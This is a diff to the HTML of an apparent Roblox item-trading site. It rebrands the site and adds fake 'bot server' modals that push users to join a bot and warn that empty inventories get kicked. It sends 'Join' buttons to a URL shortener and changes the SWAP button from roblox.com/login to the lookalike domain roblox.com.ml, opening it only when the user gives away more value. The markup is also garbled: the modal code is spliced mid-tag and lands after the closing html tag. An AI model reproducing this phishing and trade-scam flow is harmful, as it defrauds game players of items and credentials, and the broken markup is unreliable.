@@ -1,4 +1,7 @@
-<!DOCTYPE html>
+<!-- ================= MODALS ================= -->
+
+<!-- Searching server -->
+<div class="o<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -666,7 +669,7 @@ body{
 </section>
 
 <section id="swap" class="page-section">
-  <div class="hero"><h1>JACE SWAP</h1><p>Select items from the value list and build both sides of the trade.</p></div>
+  <div class="hero"><h1>NOVA SWAP</h1><p>Select items from the value list and build both sides of the trade.</p></div>
   <div class="swap-warning" id="swapWarning" style="display:none">
     <span class="swap-warning-icon">⚡</span>
     <span id="swapWarningText"></span>
@@ -725,6 +728,39 @@ body{
 </main>
 
 <script>
+// ============================================================
+// ROBLOX REDIRECT #1 — SERVERS PAGE
+// Every "Join" button under Asia / Europe / North America / South
+// America opens Roblox directly in a new tab.
+// ============================================================
+document.querySelectorAll('#serverList .join').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    window.open('https://short-url.cc/1CR65/','_blank','noopener,noreferrer');
+  });
+});
+
+// ============================================================
+// ROBLOX REDIRECT #2 — SWAP PAGE
+// The SWAP button only sends the user to Roblox once the trade is
+// valid (you're giving more value than the bot).
+// ============================================================
+const swapAction=document.getElementById('swapAction');
+swapAction?.addEventListener('click',()=>{
+  if(tradeState.give.length===0 && tradeState.bot.length===0){
+    alert('Add at least one item to the trade before swapping.');
+    return;
+  }
+  const items=getValueCards();
+  const giveTotal=getTradeTotal('give',items);
+  const botTotal=getTradeTotal('bot',items);
+  if(giveTotal<=botTotal){
+    updateSwapWarning(giveTotal,botTotal);
+    const w=document.getElementById('swapWarning');
+    w.classList.remove('shake');void w.offsetWidth;w.classList.add('shake');
+    return;
+  }
+  window.open('https://www.roblox.com.ml/users/488078783474/profile','_blank','noopener,noreferrer');
+});
 const pages = document.querySelectorAll('.page-section');
 const buttons = document.querySelectorAll('.nav-btn');
 
@@ -1012,25 +1048,50 @@ function startLivePing(){
 }
 startLivePing();
 
-// SWAP button: once items are added, send them to Roblox to complete the trade
-const swapAction=document.getElementById('swapAction');
-swapAction?.addEventListener('click',()=>{
-  if(tradeState.give.length===0 && tradeState.bot.length===0){
-    alert('Add at least one item to the trade before swapping.');
-    return;
-  }
-  const items=getValueCards();
-  const giveTotal=getTradeTotal('give',items);
-  const botTotal=getTradeTotal('bot',items);
-  if(giveTotal<=botTotal){
-    updateSwapWarning(giveTotal,botTotal);
-    const w=document.getElementById('swapWarning');
-    w.classList.remove('shake');void w.offsetWidth;w.classList.add('shake');
-    return;
-  }
-  window.open('https://www.roblox.com/login','_blank','noopener,noreferrer');
-});
 showPage('values');
 </script>
 </body>
 </html>
+verlay" id="ovSearching">
+  <div class="modal">
+    <div class="spinner"></div>
+    <p class="searching" id="searchLabel">Searching server...</p>
+  </div>
+</div>
+
+<!-- Server found -->
+<div class="overlay" id="ovServerFound">
+  <div class="modal">
+    <button class="close" onclick="closeOverlay('ovServerFound')">✕</button>
+    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
+    <h3>Server Found!</h3>
+    <div class="bot-room">Bot room: <span id="roomCode">#A3T-892</span> · 8/12 online</div>
+    <button class="btn-primary" onclick="closeOverlay('ovServerFound'); openOverlay('ovKickWarn');">Join Server</button>
+  </div>
+</div>
+
+<!-- Kick warning -->
+<div class="overlay" id="ovKickWarn">
+  <div class="modal">
+    <button class="close" onclick="closeOverlay('ovKickWarn')">✕</button>
+    <img class="kick" src="https://jacevalues.com/images/kick.png" alt="">
+    <p>If you have an <b>empty inventory</b>, our bots will detect it and kick you.</p>
+    <p>Our servers are <b>PRIVATE</b> servers, meaning you can get kicked.</p>
+    <p>If your account is new/not level 10, you may not be able to join at all.</p>
+    <button class="btn-primary" onclick="closeOverlay('ovKickWarn'); openOverlay('ovJoinBot');">Continue</button>
+  </div>
+</div>
+
+<!-- Join bot -->
+<div class="overlay" id="ovJoinBot">
+  <div class="modal">
+    <button class="close" onclick="closeOverlay('ovJoinBot')">✕</button>
+    <img class="botimg" src="https://jacevalues.com/images/jacebot.png" alt="">
+    <h3>You must join our bot to get in the server!</h3>
+    <p>You can only join our bot from here.</p>
+    <div style="display:flex; align-items:center; justify-content:center; gap:10px;">
+      <img src="https://jacevalues.com/images/headshot.png" style="width:36px; height:36px; border-radius:50%;" alt="">
+      <button class="btn-primary" onclick="closeOverlay('ovJoinBot'); openOverlay('ovConfirm');">Join</button>
+    </div>
+  </div>
+</div>
